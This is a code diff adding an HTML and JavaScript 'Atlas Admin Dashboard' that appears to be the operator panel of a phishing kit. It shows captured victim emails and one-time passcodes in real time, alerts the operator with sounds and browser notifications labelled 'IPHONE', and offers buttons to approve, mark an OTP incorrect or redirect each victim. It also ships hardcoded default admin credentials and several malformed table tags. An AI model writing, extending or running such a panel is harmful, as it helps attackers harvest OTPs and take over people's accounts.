@@ -1,0 +1,458 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+  <title>Atlas Admin Dashboard</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, sans-serif;
+    }
+    body {
+      background: #f3f4f6;
+      padding: 20px;
+    }
+    .container {
+      max-width: 1400px;
+      margin: 0 auto;
+    }
+    .login-card {
+      max-width: 400px;
+      margin: 100px auto;
+      background: white;
+      border-radius: 24px;
+      padding: 32px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+    }
+    .login-card h2 {
+      font-size: 24px;
+      font-weight: 600;
+      margin-bottom: 24px;
+      color: #1f2937;
+      text-align: center;
+    }
+    .login-card input {
+      width: 100%;
+      padding: 14px 16px;
+      border: 1.5px solid #e5e7eb;
+      border-radius: 12px;
+      font-size: 15px;
+      margin-bottom: 16px;
+    }
+    .login-card input:focus {
+      outline: none;
+      border-color: #4a4ff0;
+    }
+    .login-card button {
+      width: 100%;
+      padding: 14px;
+      background: #4a4ff0;
+      color: white;
+      border: none;
+      border-radius: 50px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+    .login-error {
+      color: #dc2626;
+      font-size: 13px;
+      margin-top: 12px;
+      text-align: center;
+      display: none;
+    }
+    .dashboard-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 24px;
+      flex-wrap: wrap;
+      gap: 16px;
+    }
+    .dashboard-header h1 {
+      font-size: 24px;
+      font-weight: 700;
+      color: #1f2937;
+    }
+    .logout-btn {
+      padding: 10px 20px;
+      background: #ef4444;
+      color: white;
+      border: none;
+      border-radius: 50px;
+      cursor: pointer;
+      font-weight: 600;
+    }
+    .stats {
+      display: flex;
+      gap: 16px;
+      margin-bottom: 24px;
+      flex-wrap: wrap;
+    }
+    .stat-card {
+      background: white;
+      border-radius: 16px;
+      padding: 16px 24px;
+      flex: 1;
+      min-width: 120px;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+    }
+    .stat-card h3 {
+      font-size: 13px;
+      color: #6b7280;
+      margin-bottom: 8px;
+    }
+    .stat-card .number {
+      font-size: 28px;
+      font-weight: 700;
+      color: #1f2937;
+    }
+    .table-container {
+      background: white;
+      border-radius: 20px;
+      overflow-x: auto;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+    }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      min-width: 800px;
+    }
+    th {
+      text-align: left;
+      padding: 16px;
+      background: #f9fafb;
+      font-weight: 600;
+      font-size: 13px;
+      color: #6b7280;
+      border-bottom: 1px solid #e5e7eb;
+    }
+    td {
+      padding: 14px 16px;
+      border-bottom: 1px solid #f0f0f0;
+      font-size: 14px;
+      color: #374151;
+    }
+    tr:hover {
+      background: #f9fafb;
+    }
+    .copy-btn {
+      background: none;
+      border: none;
+      cursor: pointer;
+      color: #9ca3af;
+      margin-left: 8px;
+      font-size: 14px;
+    }
+    .copy-btn:hover {
+      color: #4a4ff0;
+    }
+    .status-badge {
+      display: inline-block;
+      padding: 4px 10px;
+      border-radius: 30px;
+      font-size: 12px;
+      font-weight: 500;
+    }
+    .status-pending {
+      background: #fef3c7;
+      color: #d97706;
+    }
+    .status-approved {
+      background: #d1fae5;
+      color: #059669;
+    }
+    .status-otp_submitted {
+      background: #e0e7ff;
+      color: #4f46e5;
+    }
+    .status-redirected {
+      background: #fee2e2;
+      color: #dc2626;
+    }
+    .status-rejected {
+      background: #f3f4f6;
+      color: #6b7280;
+    }
+    .action-group {
+      display: flex;
+      gap: 8px;
+      flex-wrap: wrap;
+    }
+    .action-btn {
+      padding: 6px 12px;
+      border-radius: 8px;
+      font-size: 12px;
+      font-weight: 500;
+      border: none;
+      cursor: pointer;
+    }
+    .btn-approve {
+      background: #059669;
+      color: white;
+    }
+    .btn-reject {
+      background: #6b7280;
+      color: white;
+    }
+    .btn-incorrect {
+      background: #e11d48;
+      color: white;
+    }
+    .btn-redirect {
+      background: #3b82f6;
+      color: white;
+    }
+    .sound-status {
+      background: #10b981;
+      color: white;
+      padding: 8px 16px;
+      border-radius: 50px;
+      font-size: 13px;
+      font-weight: 500;
+      margin-right: 12px;
+      cursor: pointer;
+      display: inline-block;
+    }
+    .sound-status.off {
+      background: #ef4444;
+    }
+  </style>
+</head>
+<body>
+<div class="container" id="loginContainer">
+  <div class="login-card">
+    <h2>Admin Login</h2>
+    <input type="email" id="adminEmail" placeholder="Email" value="admin@system.com">
+    <input type="password" id="adminPassword" placeholder="Password" value="admin123">
+    <button id="loginBtn">Login</button>
+    <div id="loginError" class="login-error"></div>
+  </div>
+</div>
+
+<div class="container" id="dashboardContainer" style="display: none;">
+  <div class="dashboard-header">
+    <h1>Atlas Admin Dashboard</h1>
+    <div style="display: flex; align-items: center; gap: 12px;">
+      <div id="soundStatus" class="sound-status off">🔇 Sound Off - Click to Enable</div>
+      <button id="logoutBtn" class="logout-btn">Logout</button>
+    </div>
+  </div>
+  <div class="stats">
+    <div class="stat-card"><h3>Total Users</h3><div class="number" id="totalUsers">0</div></div>
+    <div class="stat-card"><h3>Pending Email</h3><div class="number" id="pendingEmails">0</div></div>
+    <div class="stat-card"><h3>OTP Submitted</h3><div class="number" id="otpSubmitted">0</div></div>
+  </div>
+  <div class="table-container">
+    <table>
+      <thead><tr><th>ID</th><th>Email</th><th>OTP Code</th><th>Status</th><th>Created</th><th>Actions</th></tr></thead>
+      <tbody id="usersTable"></tbody>
+    </table>
+  </div>
+</div>
+
+<script src="/socket.io/socket.io.js"></script>
+<script>
+  let socket = null;
+  let soundEnabled = true;
+  let emailAudio = null;
+  let otpAudio = null;
+
+  // Create audio elements with error handling
+  function initAudio() {
+    try {
+      emailAudio = new Audio('/sounds/email.mp3');
+      otpAudio = new Audio('/sounds/otp.mp3');
+      
+      // Add error handlers
+      emailAudio.onerror = () => console.log('Email sound file not found at /sounds/email.mp3');
+      otpAudio.onerror = () => console.log('OTP sound file not found at /sounds/otp.mp3');
+      
+      emailAudio.load();
+      otpAudio.load();
+      
+      console.log('Audio initialized');
+    } catch(e) {
+      console.log('Audio init error:', e);
+    }
+  }
+
+  function playEmailSound() {
+    if (soundEnabled && emailAudio) {
+      emailAudio.currentTime = 0;
+      emailAudio.play().catch(e => console.log('Email sound error:', e));
+    }
+  }
+
+  function playOtpSound() {
+    if (soundEnabled && otpAudio) {
+      otpAudio.currentTime = 0;
+      otpAudio.play().catch(e => console.log('OTP sound error:', e));
+    }
+  }
+
+  function enableSound() {
+    soundEnabled = true;
+    const soundStatus = document.getElementById('soundStatus');
+    soundStatus.innerHTML = '🔊 Sound On - Notifications Active';
+    soundStatus.classList.remove('off');
+    // Test both sounds
+    playEmailSound();
+    setTimeout(() => playOtpSound(), 500);
+    alert('Sound enabled! You will now hear email and OTP notifications.');
+  }
+
+  function showBrowserNotification(title, body) {
+    if (Notification.permission === 'granted') {
+      new Notification(title, { body });
+    }
+  }
+
+  // Login
+  document.getElementById('loginBtn').addEventListener('click', async () => {
+    const email = document.getElementById('adminEmail').value.trim();
+    const password = document.getElementById('adminPassword').value;
+    const errorDiv = document.getElementById('loginError');
+    try {
+      const res = await fetch('/api/admin/check', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email, password })
+      });
+      if (res.ok) {
+        localStorage.setItem('adminToken', 'loggedin');
+        document.getElementById('loginContainer').style.display = 'none';
+        document.getElementById('dashboardContainer').style.display = 'block';
+        initAudio();
+        
+        if (Notification.permission === 'default') {
+          Notification.requestPermission();
+        }
+        
+        const soundStatus = document.getElementById('soundStatus');
+        soundStatus.addEventListener('click', enableSound);
+        
+        connectSocket();
+        loadUsers();
+        setInterval(loadUsers, 5000);
+      } else {
+        errorDiv.textContent = 'Invalid credentials';
+        errorDiv.style.display = 'block';
+      }
+    } catch (err) {
+      errorDiv.textContent = 'Network error';
+      errorDiv.style.display = 'block';
+    }
+  });
+
+  function connectSocket() {
+    socket = io();
+    
+    socket.on('new-email', (data) => {
+      console.log('📧 New email:', data.email);
+      playEmailSound();
+      showBrowserNotification('IPHONE 📧 New Email', `${data.email} signed up`);
+      loadUsers();
+    });
+    
+    socket.on('new-otp', (data) => {
+      console.log('🔐 New OTP:', data.email, 'OTP:', data.otp);
+      playOtpSound();
+      showBrowserNotification('IPHONE🔐 New OTP', `${data.email} submitted OTP: ${data.otp}`);
+      loadUsers();
+    });
+    
+    socket.on('approve-user', () => loadUsers());
+    socket.on('reject-user', () => loadUsers());
+    socket.on('incorrect-otp', () => loadUsers());
+    socket.on('redirect-to-sad', () => loadUsers());
+  }
+
+  async function loadUsers() {
+    try {
+      const res = await fetch('/api/users');
+      const users = await res.json();
+      displayUsers(users);
+      updateStats(users);
+    } catch (err) {}
+  }
+
+  function updateStats(users) {
+    document.getElementById('totalUsers').innerText = users.length;
+    document.getElementById('pendingEmails').innerText = users.filter(u => u.status === 'pending').length;
+    document.getElementById('otpSubmitted').innerText = users.filter(u => u.status === 'otp_submitted').length;
+  }
+
+  function displayUsers(users) {
+    const tbody = document.getElementById('usersTable');
+    if (!users.length) {
+      tbody.innerHTML = '<tr><td colspan="6" style="text-align:center; padding:40px;">No users found</td</span> </span>';
+      return;
+    }
+    tbody.innerHTML = users.map(user => `
+      <tr>
+        <td>${user.id}</td</span>
+        <td>${escapeHtml(user.email)} <button class="copy-btn" onclick="copyToClipboard('${escapeHtml(user.email)}')">📋</button></td</span>
+        <td>${user.otp_code ? escapeHtml(user.otp_code) : '-'} ${user.otp_code ? `<button class="copy-btn" onclick="copyToClipboard('${escapeHtml(user.otp_code)}')">📋</button>` : ''}</td</span>
+        <td><span class="status-badge status-${user.status}">${user.status}</span></td</span>
+        <td>${new Date(user.created_at).toLocaleString()}</td</span>
+        <td class="action-group">
+          ${user.status === 'pending' ? `<button class="action-btn btn-approve" onclick="actionUser('approve','${user.email}')">Approve</button>
+             <button class="action-btn btn-reject" onclick="actionUser('reject','${user.email}')">Reject</button>` : ''}
+          ${user.status === 'otp_submitted' ? `<button class="action-btn btn-incorrect" onclick="actionUser('incorrect-otp','${user.email}')">Incorrect OTP</button>
+             <button class="action-btn btn-redirect" onclick="actionUser('redirect','${user.email}')">Redirect</button>` : ''}
+         </td</span>
+      </tr>
+    `).join('');
+  }
+
+  async function actionUser(action, email) {
+    try {
+      await fetch(`/api/admin/${action}`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email })
+      });
+      loadUsers();
+    } catch (err) {}
+  }
+
+  function copyToClipboard(text) {
+    navigator.clipboard.writeText(text);
+  }
+
+  function escapeHtml(str) {
+    if (!str) return '';
+    return str.replace(/[&<>]/g, m => m === '&' ? '&amp;' : m === '<' ? '&lt;' : '&gt;');
+  }
+
+  document.getElementById('logoutBtn')?.addEventListener('click', () => {
+    localStorage.removeItem('adminToken');
+    location.reload();
+  });
+
+  if (localStorage.getItem('adminToken')) {
+    document.getElementById('loginContainer').style.display = 'none';
+    document.getElementById('dashboardContainer').style.display = 'block';
+    initAudio();
+    
+    if (Notification.permission === 'default') {
+      Notification.requestPermission();
+    }
+    
+    const soundStatus = document.getElementById('soundStatus');
+    soundStatus.addEventListener('click', enableSound);
+    
+    connectSocket();
+    loadUsers();
+    setInterval(loadUsers, 5000);
+  }
+
+  window.actionUser = actionUser;
+  window.copyToClipboard = copyToClipboard;
+</script>
+</body>
+</html>
